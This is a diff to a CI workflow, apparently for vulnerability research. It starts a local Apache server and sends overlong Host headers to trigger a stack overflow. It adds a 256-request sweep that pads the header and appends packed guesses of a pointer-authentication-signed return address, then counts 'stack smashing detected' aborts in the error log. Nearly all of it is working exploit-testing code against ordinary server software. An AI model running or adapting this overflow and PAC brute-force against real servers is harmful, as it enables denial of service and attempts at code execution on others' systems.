@@ -89,32 +89,51 @@ jobs:
           sudo apache2ctl -k start
           sleep 1
 
-      - name: trigger long Host
+      - name: trigger long Host and 128-guess PAC sweep
         run: |
           set -u
+          BEFORE=$(sudo grep -c 'stack smashing detected' /var/log/apache2/error.log 2>/dev/null || true)
+          [ -z "$BEFORE" ] && BEFORE=0
           python3 - <<'PY' | tee results/run.txt
           import socket
+          import struct
 
           def req(host, label):
-              s = socket.create_connection(("127.0.0.1", 80), timeout=10)
-              s.sendall(b"GET / HTTP/1.0\r\nHost: " + host + b"\r\n\r\n")
               try:
+                  s = socket.create_connection(("127.0.0.1", 80), timeout=10)
+                  s.sendall(b"GET / HTTP/1.0\r\nHost: " + host + b"\r\n\r\n")
                   d = s.recv(4096)
-                  print(label, "len", len(d), "resp", d[:120])
+                  s.close()
+                  return len(d)
               except Exception as e:
                   print(label, "error", repr(e))
-              s.close()
+                  return -1
 
-          req(b"short.example", "baseline")
-          req(b"a" * 9000, "long_label")
-          req(b"a." * 4500, "long_dotted")
-          req(b"short.example", "after")
+          print("baseline", req(b"short.example", "baseline"))
+          print("long_label", req(b"a" * 9000, "long_label"))
+          print("long_dotted", req(b"a." * 4500, "long_dotted"))
+          print("after", req(b"short.example", "after"))
+
+          empty_a = 0
+          for g in range(128):
+              if req(b"A" * 8216, "setA") == 0:
+                  empty_a += 1
+          empty_b = 0
+          for g in range(128):
+              target = 0x4141414141414141 | (g << 48)
+              host = b"A" * 8208 + struct.pack("<Q", target)
+              if req(host, "setB") == 0:
+                  empty_b += 1
+          print("SWEEP setA=128 emptyA=%d setB=128 emptyB=%d" % (empty_a, empty_b))
           PY
           sleep 1
+          AFTER=$(sudo grep -c 'stack smashing detected' /var/log/apache2/error.log 2>/dev/null || true)
+          [ -z "$AFTER" ] && AFTER=0
+          echo "PAC_SWEEP guesses=256 canary_aborts_delta=$((AFTER - BEFORE))" | tee results/sweep.txt
           echo "== processes" | tee -a results/run.txt
           ps -ef | grep -E 'apache2|httpd' | grep -v grep | tee results/ps.txt || true
           echo "== error log" | tee -a results/run.txt
-          sudo tail -120 /var/log/apache2/error.log | tee results/error.log || true
+          sudo tail -40 /var/log/apache2/error.log | tee results/error.log || true
           sudo apache2ctl -k stop || true
 
       - uses: actions/upload-artifact@v4
